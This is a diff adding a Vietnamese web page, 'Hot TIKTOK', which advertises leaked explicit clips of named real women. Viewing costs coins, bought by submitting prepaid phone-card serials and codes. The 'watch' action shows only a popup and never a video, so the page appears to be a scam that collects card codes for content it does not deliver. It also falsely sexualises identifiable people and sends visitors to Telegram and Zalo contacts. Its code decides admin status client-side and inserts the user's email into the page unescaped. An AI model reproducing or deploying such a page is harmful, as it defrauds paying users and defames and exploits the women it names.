@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Hot TIKTOK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #000000, #0000ff, #99ff66, #800080);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      color: white;
+    }
+
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
+    .navbar {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .menu-toggle {
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .popup-menu {
+      display: none;
+      position: absolute;
+      top: 60px;
+      left: 15px;
+      background-color: #111;
+      padding: 10px;
+      border-radius: 8px;
+      z-index: 10;
+    }
+
+    .popup-menu a {
+      display: block;
+      color: #fff;
+      margin: 5px 0;
+      text-decoration: none;
+    }
+
+    .notification-popup {
+      background-color: rgba(0, 0, 0, 0.6);
+      text-align: center;
+      padding: 10px;
+      font-size: 16px;
+    }
+
+    .user-info {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .topup-form {
+      display: none;
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.6);
+      margin: 10px auto;
+      padding: 15px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    input, select, button {
+      padding: 10px;
+      margin: 8px 0;
+      width: 90%;
+      max-width: 300px;
+      border-radius: 6px;
+      border: none;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #ff5722;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e64a19;
+    }
+
+    .movie-columns {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+      gap: 15px;
+      padding: 20px;
+    }
+
+    .movie-box {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .movie-box img {
+      width: 100%;
+      border-radius: 6px;
+    }
+
+    .popup, .warn-popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      justify-content: center;
+      align-items: center;
+      z-index: 20;
+      background: rgba(0, 0, 0, 0.8);
+    }
+
+    .popup-content, .warn-content {
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: white;
+      width: 90%;
+      max-width: 350px;
+    }
+
+    .warn-content {
+      background: #f44336;
+    }
+  </style>
+</head>
+<body>
+  <div class="navbar">
+    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+    <a href="/logout" style="color: white; text-decoration: none;">Đăng xuất</a>
+  </div>
+
+  <div class="popup-menu" id="popupMenu">
+    <a href="#">Trang chủ</a>
+    <a href="#">Thông tin</a>
+  </div>
+
+  <div class="notification-popup">
+    <strong>Thông báo:</strong> Chào mừng bạn đến với Hot TIKTOK! Đây là nơi bạn có thể xem các video hot trên TikTok ví dụ( idol lộ clip🔞, chi tiết drama và video nếu có,...) CSKH Telegram: @mun2k11 
+   Tik Tok: @hot.tiktok031
+
+  (video mới sẽ được cập nhật liên tục nên việc web xảy ra lỗi là đều chắc chắn xảy, vì đây là web sạch không ngại rủi ro nên thông cảm cho admin nhé !!! )🤗🤗🤗
+  </div>
+
+  <div class="user-info">
+    <h2>Xin chào <span id="userName"></span></h2>
+    <p>Bạn có <span id="userCoins"></span> xu</p>
+    <button onclick="toggleTopup()" id="topupToggle">Nạp xu</button>
+  </div>
+
+  <div id="topupForm" class="topup-form"></div>
+
+  <div class="movie-columns">
+    <div class="movie-box" onclick="watchMovie()">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQNMU57mqG8MtoHtzAMhMjzZ-tJ5lvn7VNIUw&s" alt="IDOL MUN">
+      <p>IDOL MUN🔞</p>
+    </div>
+    <div class="movie-box" onclick="watchMovie()">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-nXK3vbQUnEmUE_rg9aJygipqQHVqwHsY6w&s" alt="TRẦN HÀ LINH">
+      <p>TRẦN HÀ LINH 🔞</p>
+    </div>
+    <div class="movie-box" onclick="watchMovie()">
+      <img src="https://images.kienthuc.net.vn/zoomh/800/uploaded/phuongdh/2025_01_08/3/dan-hot-girl-tiep-tuc-khuay-dong-trend-vay-bang-keo-cuc-nong-bong-Hinh-3.jpg" alt="LA HOÀNG KỲ DUYÊN">
+      <p>LA HOÀNG KỲ DUYÊN🔞</p>
+    </div>
+  </div>
+
+  <!-- Xem phim popup -->
+  <div class="popup" id="moviePopup">
+    <div class="popup-content">
+      <h3>Xem chỗ kín đáo nhé bro😜</h3>
+      <p>Thưởng thức video bạn đã chọn!</p>
+      <button onclick="closePopup()">Đóng</button>
+    </div>
+  </div>
+
+  <!-- Cảnh báo không đủ xu -->
+  <div class="popup warn-popup" id="warnPopup">
+    <div class="warn-content">
+      <strong>Không đủ xu!</strong>
+      <p>Bạn không đủ xu trong tài khoản rồi. không sao bạn liên hệ admin tele @mun2k11 hoặc zalo 0366319252 để nạp xu, nạp thêm đạn nhé !!!.</p>
+      <button onclick="closeWarn()">Đóng</button>
+    </div>
+  </div>
+
+  <script>
+    let userCoinsGlobal = 0;
+
+    function toggleMenu() {
+      const menu = document.getElementById("popupMenu");
+      menu.style.display = menu.style.display === "block" ? "none" : "block";
+    }
+
+    function toggleTopup() {
+      const form = document.getElementById("topupForm");
+      form.style.display = form.style.display === "block" ? "none" : "block";
+    }
+
+    function watchMovie() {
+      if (userCoinsGlobal >= 5) {
+        fetch('/api/watch', { method: 'POST' })
+          .then(res => res.json())
+          .then(data => {
+            if (data.success) {
+              userCoinsGlobal -= 5;
+              document.getElementById("userCoins").textContent = userCoinsGlobal;
+              document.getElementById("moviePopup").style.display = "flex";
+            }
+          });
+      } else {
+        document.getElementById("warnPopup").style.display = "flex";
+      }
+    }
+
+    function closePopup() {
+      document.getElementById("moviePopup").style.display = "none";
+    }
+
+    function closeWarn() {
+      document.getElementById("warnPopup").style.display = "none";
+    }
+
+    fetch('/api/me')
+      .then(res => res.json())
+      .then(user => {
+        document.getElementById("userName").textContent = user.email;
+        document.getElementById("userCoins").textContent = user.coins;
+        userCoinsGlobal = user.coins;
+
+        const form = document.getElementById("topupForm");
+        const toggleBtn = document.getElementById("topupToggle");
+
+        if (user.email === "admin") {
+          toggleBtn.textContent = "Cộng xu";
+          form.innerHTML = `
+            <h3>Cộng xu</h3>
+            <form action="/admin/add-coins" method="POST">
+              <input type="text" name="targetEmail" placeholder="Email người nhận" required>
+              <input type="number" name="amount" placeholder="Số xu" required>
+              <button type="submit">Cộng xu</button>
+            </form>
+          `;
+        } else {
+          toggleBtn.textContent = "Nạp xu";
+          form.innerHTML = `
+            <h3>Nạp xu</h3>
+            <form action="/submit-card" method="POST">
+              <input type="hidden" name="email" value="${user.email}">
+              <select name="cardType" required>
+                <option value="">Chọn loại thẻ</option>
+                <option value="Viettel">Viettel</option>
+                <option value="Mobifone">Mobifone</option>
+                <option value="Vinaphone">Vinaphone</option>
+              </select>
+              <input type="text" name="serial" placeholder="Serial" required>
+              <input type="text" name="code" placeholder="Mã thẻ" required>
+              <input type="number" name="amount" placeholder="Mệnh giá" required>
+              <button type="submit">Nạp thẻ</button>
+            </form>
+          `;
+        }
+      });
+  </script>
+</body>
+</html>
